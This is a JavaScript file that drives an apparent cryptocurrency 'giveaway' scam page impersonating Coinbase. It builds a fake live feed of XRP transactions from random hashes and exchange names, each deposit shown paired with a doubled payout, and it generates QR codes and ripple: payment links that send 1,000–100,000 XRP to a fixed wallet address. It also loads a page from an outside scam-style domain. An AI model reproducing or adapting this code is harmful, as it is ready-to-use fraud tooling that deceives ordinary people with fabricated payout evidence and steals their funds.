var parcent = 2
function numberWithCommas(x) {
  return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',')
}
function update_count() {
  setInterval(() => {
    $('#num_').text(parseInt($('#num_').text()) + 1)
  }, 12e4)
}
function tx(_) {
  return 1 + Math.floor(Math.random() * _)
}
function dec2hex(dec) {
  return ('0' + dec.toString(16)).substr(-2)
}
function generateId(length) {
  for (
    var result = '',
      characters = 'ABCDEFabcdef0123456789',
      charactersLength = characters.length,
      i = 0;
    i < length;
    i++
  )
    result += characters.charAt(Math.floor(Math.random() * charactersLength))
  return result
}
function create_transaction(mins) {
  var table,
    row = (table = document.getElementById('myTable')).insertRow(1),
    address = get_random(),
    amount = (100e3 * Math.random()).toFixed(2),
    conamount = numberWithCommas(amount),
    decimal = String(Math.random(1, 999))
  row.innerHTML =
    '<tr> <td><a class="hash-tag text-truncate" href="">' +
    generateId(63) +
    '</a> </td> <td class="d-none d-sm-table-cell leadger"><a href="">' +
    tx(99999999) +
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">r4vUrv5xALC91eFKwQngWkeieJC3oAgv82</span> </td> <td>' +
    conamount +
    ' XRP</td> <td><span class="grat-bgg">' +
    tx(999999) +
    '</span></td> </tr>'
  var table,
    row = (table = document.getElementById('myTable')).insertRow(1),
    send_amount,
    outcon = numberWithCommas(amount * parcent)
  row.innerHTML =
    '<tr> <td><a class="hash-tag text-truncate" href="">' +
    generateId(63) +
    '</a> </td> <td class="d-none d-sm-table-cell leadger"><a href="">' +
    tx(99999999) +
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">r4vUrv5xALC91eFKwQngWkeieJC3oAgv82</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    '</a> </td> <td>' +
    outcon +
    ' XRP</td> <td><span class="grat-bgg">' +
    tx(999999) +
    '</span></td> </tr>'
}
function update_tx() {
  setInterval(() => {
    $('#num_').text(parseInt($('#num_').text()) + 1)
  }, 12e4)
}
function new_transaction() {
  var table,
    row = document.getElementById('myTable').insertRow(1),
    address = get_random(),
    amount = (100e3 * Math.random()).toFixed(2),
    conamount = numberWithCommas(amount),
    decimal = String(Math.random(1, 999))
  ;(row.innerHTML =
    '<tr> <td><a class="hash-tag text-truncate" href="">' +
    generateId(63) +
    '</a> </td> <td class="d-none d-sm-table-cell leadger"><a href="">' +
    tx(99999999) +
    '</a></td> <td><span class="timer" >now</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">r4vUrv5xALC91eFKwQngWkeieJC3oAgv82</span> </td> <td>' +
    conamount +
    ' XRP</td> <td><span class="grat-bgg">' +
    tx(999999) +
    '</span></td> </tr>'),
    document
      .getElementById('myTable')
      .deleteRow(document.getElementById('myTable').rows.length - 1),
    document.getElementsByTagName('tr')[1].classList.add('toolbar'),
    setTimeout(() => {
      var table,
        row = document.getElementById('myTable').insertRow(1),
        send_amount,
        outcon = numberWithCommas(amount * parcent)
      ;(row.innerHTML =
        '<tr> <td><a class="hash-tag text-truncate" href="">' +
        generateId(63) +
        '</a> </td> <td class="d-none d-sm-table-cell leadger"><a href="">' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">r4vUrv5xALC91eFKwQngWkeieJC3oAgv82</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        '</a> </td> <td>' +
        outcon +
        ' XRP</td> <td><span class="grat-bgg">' +
        tx(999999) +
        '</span></td> </tr>'),
        document
          .getElementById('myTable')
          .deleteRow(document.getElementById('myTable').rows.length - 1),
        document.getElementsByTagName('tr')[1].classList.add('toolbar')
    }, 8500)
}
function update_trans() {
  for (i = 0; i < times.length; i++)
    'now' == times[i].innerHTML
      ? (times[i].innerHTML = '1 mins ago')
      : 1 == parseInt(times[i].innerHTML.split(' ')[0]) &&
        'mins' == times[i].innerHTML.split(' ')[1]
      ? (times[i].innerHTML =
          parseInt(times[i].innerHTML.split(' ')[0]) + 1 + ' mins ago')
      : parseInt(times[i].innerHTML.split(' ')[0]) >= 59 &&
        'mins' == times[i].innerHTML.split(' ')[1]
      ? (times[i].innerHTML = '1 hrs ago')
      : parseInt(times[i].innerHTML.split(' ')[0]) > 1 &&
        'mins' == times[i].innerHTML.split(' ')[1] &&
        (times[i].innerHTML =
          parseInt(times[i].innerHTML.split()[0]) + 1 + ' mins ago')
  new_transaction()
}
;(get_random = function (
  list = [
    'r' + generateId(40),
    'Binance (1)',
    'r' + generateId(40),
    'Binance (2)',
    'r' + generateId(40),
    'Binance (3)',
    'r' + generateId(40),
    'Remitano',
    'r' + generateId(40),
    'Mercatox',
    'r' + generateId(40),
    'IndaCoin',
    'r' + generateId(40),
    'CoinExchange.io',
    'r' + generateId(40),
    'HitBTC (2)',
    'r' + generateId(40),
    'HitBTC (1)',
    'r' + generateId(40),
    'LAToken (3)',
    'r' + generateId(40),
    'LAToken (2)',
    'r' + generateId(40),
    'LAToken (1)',
    'r' + generateId(40),
    'Crypto.com (1)',
    'r' + generateId(40),
    'Crypto.com (2)',
    'r' + generateId(40),
    'Crypto.com (3)',
    'r' + generateId(40),
    'Freewallet (1)',
    'r' + generateId(40),
    'Freewallet (3)',
    'r' + generateId(40),
    'Freewallet (2)',
    'r' + generateId(40),
    'Coinbase (1)',
    'r' + generateId(40),
    'Coinbase (2)',
    'r' + generateId(40),
    'Coinbase (3)',
    'r' + generateId(40),
    'Coins.ph',
    'r' + generateId(40),
    'Bittrex',
    'r' + generateId(40),
    'KuCoin (3)',
    'r' + generateId(40),
    'KuCoin (1)',
    'r' + generateId(40),
    'KuCoin (2)',
    'r' + generateId(40),
    'Stake',
    'r' + generateId(40),
    'Bitsler',
    'r' + generateId(40),
    'Kraken',
  ],
) {
  return list[Math.floor(Math.random() * list.length)]
}),
  $(document).ready(() => {
    for (i = 25; i > 0; i--) create_transaction(i)
    update_tx(), update_count()
  }),
  (times = document.getElementsByClassName('timer')),
  (window.onload = () => {
    update_trans(),
      (trans = setInterval(() => {
        update_trans()
      }, 1e4))
  }),
  $('#gen-btn').click(() => {
    ;($('#cal-in').val() >= 1000) & ($('#cal-in').val() <= 100000)
      ? ($('#warn').text(''),
        (tag = tx(999999)),
        (tm = Date.now()),
        (amount_entered = $('#cal-in').val()),
        $('#gen-amount').text(tag),
        $('#copy_').attr('data-clipboard-text', $('#gen-amount').text()),
        $('#qrcode_svg').attr(
          'src',
          'https://api.qrserver.com/v1/create-qr-code/?data=ripple%3ArDnFJiVqPbrvRh6tmMepjGTi5XgfUq5qfK%3Famount%3D' +
            amount_entered +
            '%26message%3DDeposit%2Bto%2BCoinbase%2BGiveaway%2B' +
            tm +
            '&size=150x150',
        ),
        $('#paynow')
          .parent()
          .attr(
            'href',
            'ripple:r4vUrv5xALC91eFKwQngWkeieJC3oAgv82?amount=' +
              amount_entered +
              '&message=Deposit+to+Coinbase+Giveaway+' +
              tm,
          ),
        $('.pop-body').css('display', 'flex'))
      : $('#warn').text('Amount should be within 1000 XRP to 100,000 XRP')
  }),
  $('#close').click(() => {
    $('#qrcode_svg').attr('src', 'https://www.bonanza2xevent.website/eth2xxevent.com/files/load.html')
    $('.pop-body').css('display', 'none')
  }),
  // setTimeout(function () {
  //   let viewheight = $(window).height(),
  //     viewwidth = $(window).width(),
  //     viewport
  //   document
  //     .querySelector('meta[name=viewport]')
  //     .setAttribute(
  //       'content',
  //       'height=' +
  //         viewheight +
  //         'px, width=' +
  //         viewwidth +
  //         'px, initial-scale=1.0',
  //     )
  // }, 300),
  $('#cal-in').on('input', () => {
    ;(amount = $('#cal-in').val()),
      parseInt(amount) || parseFloat(amount)
        ? $('#cal-out').val(amount * parcent)
        : $('#cal-out').val('')
  }),
  $('#cal-out').on('input', () => {
    ;(amount = $('#cal-out').val()),
      parseInt(amount) || parseFloat(amount)
        ? $('#cal-in').val(amount / parcent)
        : $('#cal-in').val('')
  })

function copy_item(item) {
  var t = window.getSelection(),
    e = document.createElement('div')
  ;(e.style.position = 'absolute'),
    (e.style.left = '-99999px'),
    document.body.appendChild(e),
    (e.innerHTML = item),
    t.selectAllChildren(e),
    window.setTimeout(function () {
      document.body.removeChild(e)
    }, 100)
}

function copy_main(id, fade) {
  copy_item($('#' + id).attr('data-clipboard-text'))
  var clipboard = new Clipboard('#' + id)
  clipboard.on('success', function () {
    $('#' + fade).css('opacity', 1), $('#' + id).css('opacity', 0)
  }),
    clipboard.on('error', function (e) {
      $('.tooltiptetext').html('Faild!')
    })
}

// Copy amount starts here

$('#copy_').click(() => {
  copy_main('copy_', 'address-card')
})

$('#copy_').mouseout(() => {
  $('#address-card').css('opacity', 0), $('#copy_').css('opacity', 1)
})

// Copy amount ends here

// Copy address part starts here

$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    'r4vUrv5xALC91eFKwQngWkeieJC3oAgv82',
  )
  copy_main('copy_address', 'done-copy')
})

$('#copy_address').mouseout(() => {
  $('#done-copy').css('opacity', 0), $('#copy_address').css('opacity', 1)
})

// Copy address part ends here
